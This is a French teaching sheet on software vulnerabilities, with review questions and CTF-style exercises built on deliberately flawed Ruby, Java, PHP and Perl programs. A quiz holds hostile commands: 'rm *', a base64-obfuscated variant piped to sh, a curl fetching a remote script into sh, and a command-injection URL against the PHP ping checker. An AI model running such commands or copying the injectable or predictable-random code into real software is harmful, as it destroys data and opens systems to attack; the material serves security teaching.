# Revue des logiciels

 1. Mettez en relation chacun des concepts suivants dans un graphe/schéma/*Mind Map* simple.
    - Programme
    - Écriture (programmation)
    - Toolchain
    - Idée
    - Ordinateur
    - Code source
    - Résultats
    - Programmeur
    - Exécution
    - Données (input)
 2. Discutez puis donnez votre définition d'un **bug**. Où se situe les bugs dans votre schéma de la question 1?
 3. Parmi les exemples suivants lesquels sont des vulnérabilités?
    1. `rm *`
    2. `echo cm0gKgo= | base64 -d | sh`
    3. `curl http://www.sh4ddy.xyz/rmstar.sh | sh` (Le nom du fichier est un bon indice de son contenu)
    4. L'application checkhost prend un paramètre `host` et puis vérifie s'il répond au `ping` afin de savoir s'il est disponible: `curl 'http://localhost/checkhost/?host=;rm+*'`
 4. En considérant vos réponses à l'exercice précédent, donnez une définition d'une **vulnérabilité logicielle**. 
    1. Est-ce que tous les bugs sont des vulnérabilité?
    2. Quelles sont les caractéristiques d'une vulnérabilité?
    3. En référence à votre schéma de la question 1,
       1. Où se situent les vulnérabilités?
       2. Qui est responsable de la vulnérabilité?
 5. Donnez une définition de l'**exploitation** d'une vulnérabilité.
 6. Qu'est-ce q'un **exploit** d'après vous?

# Exercices Fragilités

Pour chacun des exercices suivants, cherchez une vulnérabilité logicielle et trouvez un exploit qui vous permettrait de lire les fichiers `flag?.txt`. La démarche est libre à vous mais en voici tout de même un exemple.

 1. Cherchez un bug
 2. Observez ce que ce bug peut causer comme effet dans l'état ou dans le flot du logiciel
 3. Trouvez une façon de rendre ces effets utiles pour atteindre votre objectif (lire le flag)
 4. Développez votre exploit

Réfléchissez par la suite aux correctifs possibles et évaluez leur efficacité. Prenez le temps de prendre un peu de recul sur la vulnérabilité afin de bien comprendre quel est le noeud du problème. Votre correctif devrait cibler le noeud du problème.

## Auth

``` ruby
#!/usr/bin/ruby

$username = $password = $function = ""
$is_auth = false

def login # Use guest:guest as guest account
  $username = input("user?")
  $password = input("pass?")
  if validate($username, $password) then
    $is_auth = true
  end
end

def secret
  if $is_auth and $username == 'admin' then
    print_file("flag1.txt")
  end
end

while true do
  $function = input("function?")
  if $function == "login" then login end
  if $function == "secret" then secret end
end
```

## Auth 2

``` java
public class Auth2 extends AuthBase {

	Boolean isAuth = false;
	String user = null;
	
	void login() {
		isAuth = false; user = null;
		String name = input("user?");
		String pass = input("pass?");
		if (validate(name, pass))
			isAuth = true; user = name;
	}

	void secret() {
		if (user != null && user.equals("admin"))
			printFile("flag2.txt");
	}

	void start() {
		while(true) {
			String action = input("action?");
			if (action.equals("login")) login();
			if (action.equals("secret")) secret();
		}
	}

	String getUser() { return user; }

	public static void main(String[] args) {
		Auth2 auth = new Auth2();
		auth.start();
	}
}
```

## Auth 3

``` java
public class Auth3 extends AuthBase {

	String user = null;

	void login() {
		user = null;
		String name = input("user?");
		String pass = input("pass?");
		if (validate(name, pass))
			user = name;
	}

	boolean isTrusted() {
		if (user == null) return false;
		if (user == "admin") return true;
		if (user == "guest") return false;
		if (user == "anonymous") return false;
		if (user == "steve") return false;
		return true;
	}
	
	void secret() {
		if (isTrusted())
			printFile("flag3.txt");
	}

	void start() {
		while(true) {
			String action = input("action?");
			if (action.equals("login")) login();
			if (action.equals("secret")) secret();
		}
	}

	String getUser() { return user; }

	public static void main(String[] args) {
		Auth3 auth = new Auth3();
		auth.start();
	}
}
```

## Auth 4

``` java
public class Auth4 extends AuthBase {

	String user = null;

	void login() {
		user = null;
		String name = input("user?");
		String pass = input("pass?");
		if (validate(name, pass)) user = name;
	}

	private final static String[] untrusted =
			{"anonymous", "guest", "steve", "bob"};

	boolean isTrusted() {
		if (user == null) return false;
		for (int i = untrusted.length-1; i>0; i--) {
			String bad = untrusted[i];
			if (user.equals(bad)) return false;
		}
		return true;
	}

	void secret() {
		if (isTrusted()) printFile("flag4.txt");
	}

	void start() {
		while(true) {
			String action = input("action?");
			if (action.equals("login")) login();
			if (action.equals("secret")) secret();
		}
	}

	String getUser() { return user; }

	public static void main(String[] args) {
		Auth4 auth = new Auth4();
		auth.start();
	}
}
```

## Checkhost

```php
<pre>
<?php
# get the host parameter
$host = $_GET['host'];
if($host) {
	# check the host with the ping(8) command
	system("ping -c 1 -w 1 -q " . $host);
}
?>
</pre>
<form method=get>
<input type=text name=host>
<input type=submit>
</form>
```

## ARecover

``` perl
#!/usr/bin/env perl

sub recover {
	srand time;
	my $code = int rand 100;
	sendsms("Votre code est $code");
	print "Un code secret vous a été envoyé par sms.\n",
		"Entrez-le pour confirmer votre identité: ";
	my $in = <STDIN>;
	if ($in == $code) {
		print "Bon code\n";
		return 1;
	} else {
		print "Mauvais code\n";
		return 0;
	}
}

sub sendsms {
	# Not implemented yet
}

$|=1;
if(recover) {
	system("cat flag6.txt");
}
```

# CTFs

Pourquoi les CTFs:

David Brumley de [*Plaid Parliament of Pwning*](http://pwning.net/) (Carnegie Mellon University), aujourd'hui ForAllSecure
<iframe width="560" height="315" src="https://www.youtube.com/embed/6vj96QetfTg?start=0&end=1545" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
